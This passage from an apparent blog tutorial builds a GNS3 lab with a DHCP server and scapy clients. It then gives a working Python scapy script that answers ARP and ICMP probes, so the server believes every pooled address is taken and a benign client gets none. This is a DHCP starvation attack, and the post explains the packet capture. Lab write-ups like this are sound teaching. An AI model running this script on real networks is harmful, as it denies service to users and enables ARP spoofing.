  <li>Build the docker image by running <code class="language-plaintext highlighter-rouge">docker build -t dhcp-server .</code></li>
  <li>Then, import the built docker image as a GNS3 appliance. <a href="https://docs.gns3.com/docs/emulators/docker-support-in-gns3/">how</a>?</li>
  <li>Drag in the created appliance into the GNS3 workspace.</li>
  <li>Start the server by right-clicking and selecting “start”. Double-click the node to get a console.</li>
  <li>Navigate to <code class="language-plaintext highlighter-rouge">/etc/dhcp</code> and append the following content to the <code class="language-plaintext highlighter-rouge">dhcpd.conf</code> file.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>subnet 192.168.1.0 netmask 255.255.255.0 {
    range 192.168.1.150 192.168.1.160;
    option routers 192.168.1.1;
    option domain-name-servers 192.168.1.1;
    option domain-name "example.org";
}
</code></pre></div></div>

<ul>
  <li>Create an empty file, for the DHCP server to hold the leased IP addresses, by running the command:</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">touch</span> /var/lib/dhcp/dhcpd.lease
</code></pre></div></div>

<ul>
  <li>Further, assign an IP address to the DHCP server by running the following command:</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ifconfig eth0 192.168.1.1/24
</code></pre></div></div>

<ul>
  <li>Finally, startup the DHCP server by running the command <code class="language-plaintext highlighter-rouge">dhcpd</code></li>
</ul>

<h3 id="malicious-client-and-benign-client">Malicious Client and Benign Client</h3>

<p>The malicious client is a Linux machine with <a href="https://scapy.net/">scapy</a> installed, <a href="https://hub.docker.com/r/ehlers/scapy"><code class="language-plaintext highlighter-rouge">ehlers/scapy</code></a>. Import this docker image to GNS3 as an appliance too, and drag in an instance of this into the workspace. Right-click on the malicious client instance on the workspace and <code class="language-plaintext highlighter-rouge">edit config</code> to uncomment the lines under DHCP config. This configures the instance to obtain an IP address from the DHCP server.</p>

<p><img src="/assets/img/dhcp-starvation/mal-client.png" alt="Malicious client configuration" /></p>

<p>Before we start up the malicious client, drag in a GNS3 default switch to the workspace. Then, connect the malicious client and the DHCP server to the switch. Drag in another instance of <code class="language-plaintext highlighter-rouge">ehlers/scapy</code> which plays the role of a benign client. Edit the configuration to make it look similar to the malicious client. After the setup, the network looks similar to the following image:</p>

<p><img src="/assets/img/dhcp-starvation/net-topo.png" alt="Network Topology" /></p>

<p>It’s time!</p>

<p>Right-click on the link between the DHCP server and the switch to begin packet capture. Then, startup the malicious client.</p>

<p>Observe that the DHCP transactions happen and the malicious client successfully gets an IP address.</p>

<h2 id="attack">Attack</h2>

<p>Get a console by double-clicking on the malicious client and create a <code class="language-plaintext highlighter-rouge">arp_spoof.py</code> python file with the following content.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">sys</span>

<span class="kn">from</span> <span class="n">threading</span> <span class="kn">import</span> <span class="n">Thread</span>
<span class="kn">from</span> <span class="n">scapy.all</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">INTERFACE</span> <span class="o">=</span> <span class="s">"eth0"</span>
<span class="n">MY_MAC_ADDRESS</span> <span class="o">=</span> <span class="nf">get_if_hwaddr</span><span class="p">(</span><span class="n">INTERFACE</span><span class="p">)</span>
<span class="n">MY_IP_ADDRESS</span> <span class="o">=</span> <span class="nf">get_if_addr</span><span class="p">(</span><span class="n">INTERFACE</span><span class="p">)</span>

<span class="s">'''
Approach 2: Using AnsweringMachine
$ python3 arp_spoof.py
'''</span>

<span class="k">class</span> <span class="nc">ARPSpoofer</span><span class="p">(</span><span class="n">AnsweringMachine</span><span class="p">):</span>
    <span class="k">def</span> <span class="nf">is_request</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">request</span><span class="p">):</span>
        <span class="k">return</span> <span class="n">request</span><span class="p">.</span><span class="nf">haslayer</span><span class="p">(</span><span class="s">'ARP'</span><span class="p">)</span> <span class="ow">and</span> <span class="n">request</span><span class="p">[</span><span class="n">ARP</span><span class="p">].</span><span class="n">op</span> <span class="o">==</span> <span class="mi">1</span> <span class="ow">and</span> <span class="n">request</span><span class="p">[</span><span class="n">ARP</span><span class="p">].</span><span class="n">pdst</span> <span class="o">!=</span> <span class="n">MY_IP_ADDRESS</span>
    
    <span class="k">def</span> <span class="nf">make_reply</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">request</span><span class="p">):</span>
        <span class="n">response</span> <span class="o">=</span> <span class="nc">Ether</span><span class="p">()</span><span class="o">/</span><span class="nc">ARP</span><span class="p">()</span>

        <span class="n">response</span><span class="p">[</span><span class="n">Ether</span><span class="p">].</span><span class="n">dst</span> <span class="o">=</span> <span class="n">request</span><span class="p">[</span><span class="n">Ether</span><span class="p">].</span><span class="n">src</span>
        <span class="n">response</span><span class="p">[</span><span class="n">Ether</span><span class="p">].</span><span class="n">src</span> <span class="o">=</span> <span class="n">MY_MAC_ADDRESS</span>

        <span class="n">response</span><span class="p">[</span><span class="n">ARP</span><span class="p">].</span><span class="n">op</span> <span class="o">=</span> <span class="mi">2</span>
        <span class="n">response</span><span class="p">[</span><span class="n">ARP</span><span class="p">].</span><span class="n">hwsrc</span> <span class="o">=</span> <span class="n">MY_MAC_ADDRESS</span>
        <span class="n">response</span><span class="p">[</span><span class="n">ARP</span><span class="p">].</span><span class="n">hwdst</span> <span class="o">=</span> <span class="n">request</span><span class="p">[</span><span class="n">ARP</span><span class="p">].</span><span class="n">hwsrc</span>
        <span class="n">response</span><span class="p">[</span><span class="n">ARP</span><span class="p">].</span><span class="n">psrc</span> <span class="o">=</span> <span class="n">request</span><span class="p">[</span><span class="n">ARP</span><span class="p">].</span><span class="n">pdst</span>
        <span class="n">response</span><span class="p">[</span><span class="n">ARP</span><span class="p">].</span><span class="n">pdst</span> <span class="o">=</span> <span class="n">request</span><span class="p">[</span><span class="n">ARP</span><span class="p">].</span><span class="n">psrc</span>

        <span class="k">return</span> <span class="n">response</span><span class="p">[</span><span class="n">ARP</span><span class="p">]</span>

<span class="k">class</span> <span class="nc">PingResponder</span><span class="p">(</span><span class="n">AnsweringMachine</span><span class="p">):</span>
    <span class="k">def</span> <span class="nf">is_request</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">request</span><span class="p">):</span>
        <span class="k">return</span> <span class="n">request</span><span class="p">.</span><span class="nf">haslayer</span><span class="p">(</span><span class="s">'ICMP'</span><span class="p">)</span> <span class="ow">and</span> <span class="n">request</span><span class="p">[</span><span class="n">ICMP</span><span class="p">].</span><span class="nb">type</span> <span class="o">==</span> <span class="mi">8</span> <span class="ow">and</span> <span class="n">request</span><span class="p">[</span><span class="n">IP</span><span class="p">].</span><span class="n">dst</span> <span class="o">!=</span> <span class="n">MY_IP_ADDRESS</span>
    
    <span class="k">def</span> <span class="nf">make_reply</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">request</span><span class="p">):</span>
        <span class="n">response</span> <span class="o">=</span> <span class="nc">Ether</span><span class="p">()</span><span class="o">/</span><span class="nc">IP</span><span class="p">()</span><span class="o">/</span><span class="nc">ICMP</span><span class="p">()</span><span class="o">/</span><span class="s">""</span>

        <span class="n">response</span><span class="p">[</span><span class="n">Ether</span><span class="p">].</span><span class="n">dst</span> <span class="o">=</span> <span class="n">request</span><span class="p">[</span><span class="n">Ether</span><span class="p">].</span><span class="n">src</span>
        <span class="n">response</span><span class="p">[</span><span class="n">Ether</span><span class="p">].</span><span class="n">src</span> <span class="o">=</span> <span class="n">MY_MAC_ADDRESS</span>

        <span class="n">response</span><span class="p">[</span><span class="n">IP</span><span class="p">].</span><span class="n">src</span> <span class="o">=</span> <span class="n">request</span><span class="p">[</span><span class="n">IP</span><span class="p">].</span><span class="n">dst</span>
        <span class="n">response</span><span class="p">[</span><span class="n">IP</span><span class="p">].</span><span class="n">dst</span> <span class="o">=</span> <span class="n">request</span><span class="p">[</span><span class="n">IP</span><span class="p">].</span><span class="n">src</span>

        <span class="n">response</span><span class="p">[</span><span class="n">ICMP</span><span class="p">].</span><span class="nb">type</span> <span class="o">=</span> <span class="mi">0</span>
        <span class="n">response</span><span class="p">[</span><span class="n">ICMP</span><span class="p">].</span><span class="nb">id</span> <span class="o">=</span> <span class="n">request</span><span class="p">[</span><span class="n">ICMP</span><span class="p">].</span><span class="nb">id</span>
        <span class="n">response</span><span class="p">[</span><span class="n">ICMP</span><span class="p">].</span><span class="n">seq</span> <span class="o">=</span> <span class="n">request</span><span class="p">[</span><span class="n">ICMP</span><span class="p">].</span><span class="n">seq</span>

        <span class="n">response</span><span class="p">[</span><span class="n">Raw</span><span class="p">].</span><span class="n">load</span> <span class="o">=</span> <span class="n">request</span><span class="p">[</span><span class="n">Raw</span><span class="p">].</span><span class="n">load</span>

        <span class="k">return</span> <span class="n">response</span><span class="p">[</span><span class="n">IP</span><span class="p">]</span>

<span class="n">arp_spoofer</span> <span class="o">=</span> <span class="nc">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="nc">ARPSpoofer</span><span class="p">())</span>
<span class="n">arp_spoofer</span><span class="p">.</span><span class="nf">start</span><span class="p">()</span>

<span class="n">ping_responder</span> <span class="o">=</span> <span class="nc">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="nc">PingResponder</span><span class="p">())</span>
<span class="n">ping_responder</span><span class="p">.</span><span class="nf">start</span><span class="p">()</span>

<span class="n">arp_spoofer</span><span class="p">.</span><span class="nf">join</span><span class="p">()</span>
<span class="n">ping_responder</span><span class="p">.</span><span class="nf">join</span><span class="p">()</span>
</code></pre></div></div>

<p>The code performs ARP spoofing and is explained in <a href="/2020/08/02/arp-spoofing-using-scapy.html">one of my older articles</a> in detail. In brief, each thread listens to a specific type of request i.e. ARP request and ICMP request and responds to them accordingly. As the ARP requests are replied by the malicious node, the switch believes that the MAC address associated with the IP address in question (ARP protocol) is that of the malicious node’s MAC address. That is how ARP spoofing is achieved.</p>

<p>Run the python code by hitting the following command:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python arp_spoof.py
</code></pre></div></div>

<p>Now, start up the benign client and observe!</p>

<h3 id="observation">Observation</h3>

<p>Double click on the benign client to get a console. Run, <code class="language-plaintext highlighter-rouge">ifconfig</code> and observe that the benign client hasn’t received an IP address yet!</p>

<h3 id="why">Why?</h3>

<p>Observe the running packet capture.</p>

<p><img src="/assets/img/dhcp-starvation/dhcp-starvation.png" alt="DHCP starvation in action" /></p>

<p>The benign client continuously makes DHCP Discover, while the DHCP server is busy crafting the DHCP Offer. The DHCP server is not able to find an available IP address in it’s DHCP pool. It finds an IP address from the DHCP pool, checks if it already taken by another host by making an ARP request followed by an ICMP request, and that is where the malicious client jumps in to respond to those messages. Thus, the DHCP server concludes that the IP address is already taken and skips to the following available IP address in the pool. The process repeats infinitely, and the benign client stays without an IP address. Hence, a DHCP starvation attack was carried out!</p>

<blockquote>
  <p>I have them all, but I can’t use any! - DHCP Server</p>
</blockquote>]]></content><author><name></name></author><category term="advanced" /><category term="application" /><category term="cybersecurity" /><category term="networking" /><category term="dhcp" /><category term="featured" /><summary type="html"><![CDATA[Most defense systems filter out repeated DHCP requests. What if you could perform DHCP starvation without sending a DCHP request?]]></summary></entry></feed>